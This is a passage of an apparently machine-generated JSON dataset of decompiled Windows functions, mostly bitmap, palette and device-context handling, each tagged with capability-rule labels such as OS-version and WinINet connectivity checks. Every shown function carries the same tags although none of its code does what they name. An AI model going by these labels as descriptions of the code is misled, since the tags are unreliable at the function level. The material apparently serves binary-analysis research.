puStack172 = &fcn.00428b08::lpvObject;\n            uStack176 = 0x54;\n            iStack180 = hgdiobj;\n            uStack184 = 0x428b8d;\n            iVar4 = sub.gdi32.dll_GetObjectA();\n            if (iVar4 < 0x18) {\n                uStack184 = 0x428b97;\n                fcn.004259f8();\n            }\n        }\n        uStack184 = 0;\n        iStack188 = 0x428b9e;\n        sub.user32.dll_GetDC();\n        iStack188 = 0x428ba3;\n        iStack188 = fcn.00425b18();\n        puStack192 = 0x428baf;\n        hdc = iStack188;\n        sub.gdi32.dll_CreateCompatibleDC();\n        puStack192 = 0x428bb4;\n        hdcDest = fcn.00425b18();\n        uStack196 = 0x429156;\n        iStack200 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff38;\n        if (*(arg_ch + 0x18) < 0x28) {\n            if ((*(arg_ch + 0x10) | *(arg_ch + 0x12)) == 1) {\n                puStack204 = NULL;\n                uStack208 = 1;\n                iStack212 = 1;\n                uStack216 = *(arg_ch + 8);\n                iStack220 = *(arg_ch + 4);\n                puStack224 = 0x428bfb;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateBitmap();\n                puStack224 = 0x428c00;\n                var_10h = fcn.00425b18();\n            }\n            else {\n                puStack204 = *(arg_ch + 8);\n                uStack208 = *(arg_ch + 4);\n                iStack212 = hdc;\n                uStack216 = 0x428c1f;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateCompatibleBitmap();\n                uStack216 = 0x428c24;\n                var_10h = fcn.00425b18();\n            }\n            uStack216 = 0x428e6f;\n            fcn.00425b18();\n            uStack216 = var_10h;\n            iStack220 = hdcDest;\n            puStack224 = 0x428e7c;\n            sub.gdi32.dll_SelectObject();\n            puStack224 = 0x428e81;\n            var_14h = fcn.00425b18();\n            iStack228 = 0x429107;\n            iStack232 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff18;\n            puStack240 = 0x4290f6;\n            pcStack244 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff0c;\n            var_34h = 0;\n            uVar8 = 0;\n            puVar1 = &stack0xfffffffc;\n            puStack224 = &stack0xfffffffc;\n            if (hpal != 0) {\n                puStack248 = NULL;\n                iStack252 = hpal;\n                iStack256 = hdcDest;\n                puStack260 = 0x428ebc;\n                puStack224 = &stack0xfffffffc;\n                var_34h = sub.gdi32.dll_SelectPalette();\n                puStack260 = hdcDest;\n                puStack264 = 0x428ec8;\n                sub.gdi32.dll_RealizePalette();\n                puVar1 = puStack236;\n            }\n            puStack236 = puVar1;\n            iStack268 = 0x4290d4;\n            iStack272 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffef0;\n            if (arg_8h == 0) {\n                puStack288 = NULL;\n                iStack292 = 0;\n                iStack296 = hdcDest;\n                iStack300 = 0x428fb5;\n                puStack264 = &stack0xfffffffc;\n                sub.gdi32.dll_PatBlt();\n            }\n            else {\n                puStack264 = &stack0xfffffffc;\n                fcn.00424fec();\n                puStack288 = 0x428f09;\n                fcn.00418448(&fcn.00428b08::lprc, *(arg_ch + 8));\n                puStack288 = &fcn.00428b08::lprc;\n                iStack292 = hdcDest;\n                iStack296 = 0x428f19;\n                sub.user32.dll_FillRect();\n                iStack296 = 0x428f27;\n                iStack296 = fcn.00424230();\n                iStack300 = hdcDest;\n                puStack304 = 0x428f31;\n                sub.gdi32.dll_SetTextColor();\n                puStack304 = 0x428f3c;\n                fcn.00424fb0();\n                puStack304 = 0x428f41;\n                puStack304 = fcn.00424230();\n                iStack308 = hdcDest;\n                puStack312 = 0x428f4b;\n                sub.gdi32.dll_SetBkColor();\n                if ((*(arg_ch + 0x26) == 1) && (*(arg_ch + 0x14) != 0)) {\n                    puStack312 = 0x428f6c;\n                    var_30h = fcn.00424230();\n                    puStack312 = 0x428f7a;\n                    fcn.00424fb0();\n                    puStack312 = 0x428f7f;\n                    var_2ch = fcn.00424230();\n                    puStack312 = &fcn.00428b08::var_30h;\n                    sub.gdi32.dll_SetDIBColorTable(hdcDest, 0, 2);\n                }\n            }\n            if (hgdiobj != 0) {\n                iStack300 = hdc;\n                puStack304 = 0x428fc8;\n                sub.gdi32.dll_CreateCompatibleDC();\n                puStack304 = 0x428fcd;\n                var_20h = fcn.00425b18();\n                iStack308 = 0x4290aa;\n                puStack312 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffec8;\n                puStack304 = &stack0xfffffffc;\n                sub.gdi32.dll_SelectObject(var_20h, hgdiobj);\n                uVar5 = fcn.00425b18();\n                if (var_8h != 0) {\n                    uVar8 = sub.gdi32.dll_SelectPalette(var_20h, var_8h, 0);\n                    sub.gdi32.dll_RealizePalette(var_20h);\n                }\n                if (arg_8h != 0) {\n                    uVar6 = fcn.00424230();\n                    sub.gdi32.dll_SetTextColor(var_20h, uVar6);\n                    fcn.00424fb0();\n                    uVar6 = fcn.00424230();\n                    sub.gdi32.dll_SetBkColor(var_20h, uVar6);\n                }\n                sub.gdi32.dll_BitBlt(hdcDest, 0, 0, *(arg_ch + 4), *(arg_ch + 8), var_20h, 0, 0, 0xcc0020);\n                if (var_8h != 0) {\n                    sub.gdi32.dll_SelectPalette(var_20h, uVar8, 0xffffffff);\n                }\n                iVar4 = var_20h;\n                sub.gdi32.dll_SelectObject(var_20h, uVar5);\n                fcn.00425b18();\n                *in_FS_OFFSET = iVar4;\n                uVar8 = sub.gdi32.dll_DeleteDC(var_20h, 0x4290b1);\n                return uVar8;\n            }\n            uVar8 = 0;\n            *in_FS_OFFSET = iStack296;\n            puStack288 = 0x4290db;\n            if (hpal != 0) {\n                iStack292 = 0xffffffff;\n                iStack296 = var_34h;\n                iStack300 = hdcDest;\n                puStack304 = 0x4290d3;\n                uVar8 = sub.gdi32.dll_SelectPalette();\n            }\n            return uVar8;\n        }\n        puStack204 = 0x428c36;\n        puStack192 = &stack0xfffffffc;\n        pbmi = fcn.00402f00();\n        uStack208 = 0x428e60;\n        iStack212 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff2c;\n        *(arg_ch + 0x18) = 0x28;\n        *(arg_ch + 0x24) = 1;\n        puStack204 = &stack0xfffffffc;\n        if (*(arg_ch + 0x26) == 0) {\n            uStack216 = 0xc;\n            iStack220 = hdc;\n            puStack224 = 0x428c6f;\n            puStack204 = &stack0xfffffffc;\n            iVar2 = sub.gdi32.dll_GetDeviceCaps();\n            puStack224 = 0xe;\n            iStack228 = hdc;\n            iStack232 = 0x428c7c;\n            iVar3 = sub.gdi32.dll_GetDeviceCaps();\n            *(arg_ch + 0x26) = iVar2 * iVar3;\n        }\n        puVar9 = arg_ch + 0x18;\n        puVar10 = pbmi;\n        for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(arg_ch + 4) = *(arg_ch + 0x1c);\n        *(arg_ch + 8) = *(arg_ch + 0x20);\n        if (*(arg_ch + 0x26) < 9) {\n            if ((*(arg_ch + 0x26) == 1) && ((hgdiobj == 0 || (var_74h == 0)))) {\n                pbmi[10] = 0;\n                pbmi[0xb] = 0xffffff;\n            }\n            else if (hpal == 0) {\n                if (hgdiobj != 0) {\n                    iStack232 = hgdiobj;\n                    puStack236 = hdcDest;\n                    puStack240 = 0x428d26;\n                    var_14h = sub.gdi32.dll_SelectObject();\n                    if ((var_70h == 0) || (var_74h == 0)) {\n                        puStack240 = NULL;\n                        pcStack244 = pbmi;\n                        puStack248 = NULL;\n                        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n                        iStack252 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n                        iStack256 = 0;\n                        puStack260 = hgdiobj;\n                        puStack264 = hdcDest;\n                        iStack268 = 0x428d77;\n                        sub.gdi32.dll_GetDIBits();\n                    }\n                    else {\n                        puStack240 = pbmi + 10;\n                        pcStack244 = pe_nt_image_headers32;\n                        puStack248 = NULL;\n                        iStack252 = hdcDest;\n                        iStack256 = 0x428d4c;\n                        uVar8 = sub.gdi32.dll_GetDIBColorTable();\n                        *(arg_ch + 0x38) = uVar8;\n                    }\n                    puStack224 = var_14h;\n                    iStack228 = hdcDest;\n                    iStack232 = 0x428d84;\n                    sub.gdi32.dll_SelectObject();\n                }\n            }\n            else {\n                iStack232 = 0x428d0a;\n                fcn.004262b4();\n            }\n        }\n        else if (((*(arg_ch + 0x26) == 0x10) || (*(arg_ch + 0x26) == 0x20)) && ((*(arg_ch + 0x28) & 3) != 0)) {\n            iStack232 = 0x428dad;\n            fcn.00428abc();\n            iStack232 = 0x428dc3;\n            fcn.004030fc();\n        }\n        iStack232 = 0;\n        puStack236 = NULL;\n        puStack240 = &fcn.00428b08::var_28h;\n        pcStack244 = NULL;\n        puStack248 = pbmi;\n        iStack252 = hdc;\n        iStack256 = 0x428dda;\n        sub.gdi32.dll_CreateDIBSection();\n        iStack256 = 0x428ddf;\n        var_10h = fcn.00425b18();\n        if (var_28h == 0) {\n            iStack256 = 0x428ded;\n            fcn.00425a70();\n        }\n        if ((((hgdiobj == 0) || (*(arg_ch + 0x1c) != var_84h)) || (*(arg_ch + 0x20) != var_80h)) ||\n           (*(arg_ch + 0x26) < 9)) {\n            *in_FS_OFFSET = iStack252;\n            pcStack244 = 0x428e67;\n            puStack248 = 0x428e5f;\n            uVar8 = fcn.00402f1c();\n            return uVar8;\n        }\n        iStack256 = 0;\n        puStack260 = pbmi;\n        puStack264 = var_28h;\n        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n        iStack268 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n        iStack272 = 0;\n        sub.gdi32.dll_GetDIBits();\n        fcn.00404f70();\n        fcn.00404f70();\n    }\n    return var_10h;\n}\n",
        "token_count": 3772
    },
    "0042916c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0042916c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack1064;\n    int32_t iStack1060;\n    uchar *puStack1056;\n    int32_t iStack1052;\n    uint uStack1048;\n    uchar *puStack1044;\n    uint uStack1040;\n    \n    puStack1044 = &stack0xfffffbf0;\n    uVar2 = 0;\n    if (in_EAX != 0) {\n        uStack1040 = 0;\n        uStack1048 = 4;\n        puStack1056 = 0x42918a;\n        iStack1052 = in_EAX;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if ((iVar1 != 0) && (iStack1052 != 0)) {\n            uStack1048 = CONCAT22(iStack1052, 0x300);\n            puStack1056 = &stack0xfffffbec;\n            iStack1060 = iStack1052;\n            uStack1064 = 0;\n            sub.gdi32.dll_GetPaletteEntries();\n            uVar2 = sub.gdi32.dll_CreatePalette(&stack0xfffffbd8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 298
    },
    "004291d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004291d0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffec8;\n    int32_t in_stack_ffffff24;\n    int32_t iStack204;\n    uint uStack200;\n    uchar *puStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack136;\n    uint *puStack132;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char var_11h;\n    int32_t hdcDest;\n    int32_t hdc;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    hgdiobj = 0;\n    if (in_EAX != 0) {\n        puStack132 = &fcn.004291d0::lpvObject;\n        uStack136 = 0x54;\n        puStack144 = 0x4291f8;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            puStack144 = 0x429207;\n            fcn.004286c4();\n            var_8h = 0;\n            hdcDest = 0;\n            uStack148 = 0x4293cb;\n            iStack152 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff68;\n            uStack156 = 0;\n            iStack160 = 0x429226;\n            puStack144 = &stack0xfffffffc;\n            sub.user32.dll_GetDC();\n            iStack160 = 0x42922b;\n            iStack160 = fcn.00425b18();\n            uStack164 = 0x429237;\n            var_8h = iStack160;\n            sub.gdi32.dll_CreateCompatibleDC();\n            uStack164 = 0x42923c;\n            hdcDest = fcn.00425b18();\n            uStack164 = 0;\n            uStack168 = 1;\n            uStack172 = 1;\n            uStack176 = nHeight;\n            uStack180 = nWidth;\n            iStack184 = 0x429252;\n            hgdiobj = sub.gdi32.dll_CreateBitmap();\n            if (hgdiobj != 0) {\n                iStack188 = hdcDest;\n                iStack192 = 0x42926c;\n                iStack184 = hgdiobj;\n                var_1ch = sub.gdi32.dll_SelectObject();\n                if (param_1 != 0x1fffffff) {\n                    iStack192 = var_8h;\n                    puStack196 = 0x42929c;\n                    sub.gdi32.dll_CreateCompatibleDC();\n                    puStack196 = 0x4292a1;\n                    hdc = fcn.00425b18();\n                    uStack200 = 0x429383;\n                    iStack204 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff34;\n                    if (var_5ch == 0) {\n                        var_11h = '\\0';\n                        puStack196 = &stack0xfffffffc;\n                    }\n                    else {\n                        var_11h = '\\x01';\n                        var_58h = 0;\n                        puStack196 = &stack0xfffffffc;\n                        in_EAX = fcn.00428b08(0, &fcn.004291d0::lpvObject);\n                    }\n                    var_18h = sub.gdi32.dll_SelectObject(hdc, in_EAX);\n                    if (param_2 != 0) {\n                        sub.gdi32.dll_SelectPalette(hdc, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdc);\n                        sub.gdi32.dll_SelectPalette(hdcDest, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdcDest);\n                    }\n                    uVar2 = sub.gdi32.dll_SetBkColor(hdc, param_1);\n                    sub.gdi32.dll_BitBlt(hdcDest, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xcc0020);\n                    sub.gdi32.dll_SetBkColor(hdc, uVar2);\n                    if (var_18h != 0) {\n                        in_stack_fffffec8 = hdc;\n                        sub.gdi32.dll_SelectObject(hdc, var_18h);\n                    }\n                    if (var_11h != '\\0') {\n                        sub.gdi32.dll_DeleteObject(in_EAX);\n                    }\n                    *in_FS_OFFSET = in_stack_fffffec8;\n                    uVar2 = sub.gdi32.dll_DeleteDC(hdc, 0x42938a);\n                    return uVar2;\n                }\n                iStack192 = 0x42;\n                puStack196 = nHeight;\n                uStack200 = nWidth;\n                iStack204 = 0;\n                sub.gdi32.dll_PatBlt(hdcDest, 0);\n                if (var_1ch != 0) {\n                    in_stack_ffffff24 = hdcDest;\n                    sub.gdi32.dll_SelectObject(hdcDest, var_1ch);\n                }\n            }\n            uVar2 = 0;\n            *in_FS_OFFSET = in_stack_ffffff24;\n            if (hdcDest != 0) {\n                uVar2 = sub.gdi32.dll_DeleteDC(hdcDest, 0x4293d2);\n            }\n            if (var_8h != 0) {\n                uVar2 = sub.user32.dll_ReleaseDC(0, var_8h);\n            }\n            return uVar2;\n        }\n    }\n    return hgdiobj;\n}\n",
        "token_count": 1345
    },
    "004293dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004293dc(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00426cb4();\n    in_EAX[0xd] = 0x20000000;\n    iVar1 = fcn.00404620();\n    in_EAX[10] = iVar1;\n    fcn.00428934();\n    if (*0x491bb8 != '\\0') {\n        (**(*in_EAX + 0x70))();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 215
    },
    "004296e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004296e0(int32_t *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_2ch;\n    int32_t arg_28h;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_dh;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = in_EAX[10];\n    uStack48 = 0x429702;\n    var_4h = param_2;\n    fcn.004257f0();\n    uStack48 = 0x429709;\n    fcn.00429d5c();\n    var_8h = 0;\n    var_9h = 0;\n    iVar3 = *(iVar6 + 0x10);\n    if (iVar3 != 0) {\n        uStack48 = 0xffffffff;\n        uStack56 = *(var_4h + 4);\n        uStack60 = 0x429728;\n        iStack52 = iVar3;\n        var_8h = sub.gdi32.dll_SelectPalette();\n        uStack60 = *(var_4h + 4);\n        uStack64 = 0x429737;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack64 = 0xc;\n    uStack68 = *(var_4h + 4);\n    uStack72 = 0x429749;\n    var_9h = iVar3 != 0;\n    uStack72 = sub.gdi32.dll_GetDeviceCaps();\n    uStack76 = 0xe;\n    puStack80 = *(var_4h + 4);\n    uStack84 = 0x429758;\n    iVar3 = sub.gdi32.dll_GetDeviceCaps();\n    if ((puStack80 * iVar3 < 9) && (puStack80 * iVar3 < *(iVar6 + 0x2a) * *(iVar6 + 0x28))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (bVar1) {\n        puStack80 = &fcn.004296e0::var_11h;\n        uStack84 = *(var_4h + 4);\n        puStack88 = 0x42978b;\n        sub.gdi32.dll_GetBrushOrgEx();\n        puStack88 = 0x4;\n        uStack92 = *(var_4h + 4);\n        puStack96 = 0x429799;\n        sub.gdi32.dll_SetStretchBltMode();\n        puStack96 = &fcn.004296e0::var_11h;\n        puStack100 = var_dh;\n        uStack104 = var_11h;\n        uStack108 = *(var_4h + 4);\n        sub.gdi32.dll_SetBrushOrgEx();\n    }\n    else {\n        puStack80 = 0x4297ba;\n        cVar2 = fcn.00429a6c();\n        if (cVar2 == '\\0') {\n            puStack80 = 0x3;\n            uStack84 = 0x4297c8;\n            uStack84 = fcn.00425714();\n            puStack88 = 0x4297ce;\n            sub.gdi32.dll_SetStretchBltMode();\n        }\n    }\n    uStack92 = 0x42991e;\n    puStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack100 = 0x4297e3;\n    puStack88 = &stack0xfffffffc;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        puStack100 = 0x4297ee;\n        fcn.00429cfc();\n    }\n    puStack100 = 0x4297f5;\n    fcn.004299b0();\n    puStack100 = 0x429801;\n    fcn.004257f0();\n    puStack100 = 0x429808;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        uStack104 = 0x4298b3;\n        uStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar3 = fcn.00425b18();\n        iVar4 = sub.gdi32.dll_SelectObject(iVar3, *(iVar6 + 0xc));\n        arg_2ch = param_1[2] - *param_1;\n        arg_28h = param_1[3] - param_1[1];\n        iVar5 = fcn.004299b0();\n        uVar7 = 0;\n        fcn.00425cc8(0, 0, iVar3, *(iVar6 + 0x20), *(iVar6 + 0x1c), 0, 0, *(iVar5 + 4), arg_28h, arg_2ch);\n        *in_FS_OFFSET = uVar7;\n        if (iVar4 != 0) {\n            sub.gdi32.dll_SelectObject(iVar3, iVar4, 0x4298f8);\n        }\n        if (iVar3 != 0) {\n            sub.gdi32.dll_DeleteDC(iVar3);\n        }\n        return;\n    }\n    puStack100 = *(var_4h + 0x20);\n    uStack104 = *(iVar6 + 0x20);\n    uStack108 = *(iVar6 + 0x1c);\n    iVar6 = fcn.004299b0(0, 0);\n    uVar7 = *(var_4h + 4);\n    sub.gdi32.dll_StretchBlt(uVar7, *param_1, param_1[1], param_1[2] - *param_1, param_1[3] - param_1[1], *(iVar6 + 4));\n    *in_FS_OFFSET = uVar7;\n    if (var_9h != '\\0') {\n        sub.gdi32.dll_SelectPalette(*(var_4h + 4), var_8h, 0xffffffff, 0x429925);\n    }\n    return;\n}\n",
        "token_count": 1570
    },
    "00429930": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429930(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (1 < *(iVar1 + 4)) {\n        fcn.00429c5c();\n        fcn.0042957c(iVar1 + 0x18);\n        return;\n    }\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 8) != *(iVar1 + 0x14))) {\n        if ((*(iVar1 + 0x14) != 0) && (iVar2 = sub.gdi32.dll_DeleteObject(*(iVar1 + 0x14)),  iVar2 == 0)) {\n            fcn.00425a70();\n        }\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x2c) = 0;\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "004299b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004299b0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0xb] == 0) {\n        fcn.00429c5c();\n        if (in_EAX[0xb] == 0) {\n            iVar1 = fcn.00428740();\n            in_EAX[0xb] = iVar1;\n            *(iVar1 + 0x2c) = in_EAX;\n            *(iVar1 + 0x28) = *(*in_EAX + 0x10);\n            *(iVar1 + 0x34) = in_EAX;\n            *(iVar1 + 0x30) = fcn.0042963c;\n        }\n    }\n    return in_EAX[0xb];\n}\n",
        "token_count": 179
    },
    "00429a1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00429a1c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    unkbyte3 Var3;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    Var3 = iVar1 >> 8;\n    if ((*(iVar1 + 8) == 0) || (*(iVar1 + 8) == *(iVar1 + 0x14))) {\n        if (*(iVar1 + 0x14) != 0) {\n            return 0;\n        }\n        if (*(iVar1 + 0x30) == 0) {\n            uVar2 = CONCAT31(Var3, 1);\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = CONCAT31(Var3, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 195
    },
    "00429bd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429bd8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 0x14) == 0)) {\n        fcn.00429d5c();\n        if (*(iVar1 + 0x30) == 0) {\n            sub.gdi32.dll_GetObjectA(*(iVar1 + 8), 0x54, iVar1 + 0x18);\n            *(iVar1 + 0x30) = 0x28;\n            *(iVar1 + 0x34) = *(iVar1 + 0x1c);\n            *(iVar1 + 0x38) = *(iVar1 + 0x20);\n            *(iVar1 + 0x3c) = 1;\n            *(iVar1 + 0x3e) = *(iVar1 + 0x28) * *(iVar1 + 0x2a);\n        }\n        uVar2 = fcn.00428b08(0, iVar1 + 0x18);\n        *(iVar1 + 0x14) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "00429c5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429c5c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (((*(iVar1 + 8) == 0) && (*(iVar1 + 0x14) == 0)) && (*(iVar1 + 0x6c) != 0)) {\n        puStackY32 = 0x429c89;\n        fcn.0041b734(0, 0);\n        iVar1 = in_EAX[4];\n        iVar2 = in_EAX[5];\n        uStackY36 = 0x429cdf;\n        uStackY40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        in_EAX[4] = 0;\n        in_EAX[5] = 0;\n        puStackY32 = &stack0xfffffffc;\n        (**(*in_EAX + 0x54))();\n        *in_FS_OFFSET = uStackY40;\n        in_EAX[4] = iVar1;\n        in_EAX[5] = iVar2;\n        return;\n    }\n    iVar1 = in_EAX[10];\n    if (*(iVar1 + 8) == 0) {\n        *(iVar1 + 8) = *(iVar1 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 355
    },
    "00429cfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429cfc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((*(in_EAX + 0x32) == '\\0') || (*(in_EAX + 0x31) == '\\0')) {\n        iVar1 = *(in_EAX + 0x28);\n        if (*(iVar1 + 0xc) != 0) {\n            fcn.004286c4();\n            sub.gdi32.dll_DeleteObject(*(iVar1 + 0xc));\n            *(iVar1 + 0xc) = 0;\n        }\n        fcn.00429c4c();\n        fcn.00429c5c();\n        iVar1 = *(in_EAX + 0x28);\n        fcn.00429b88();\n        uVar2 = fcn.004291d0();\n        *(iVar1 + 0xc) = uVar2;\n        *(in_EAX + 0x32) = 1;\n        *(in_EAX + 0x31) = 1;\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "00429d5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
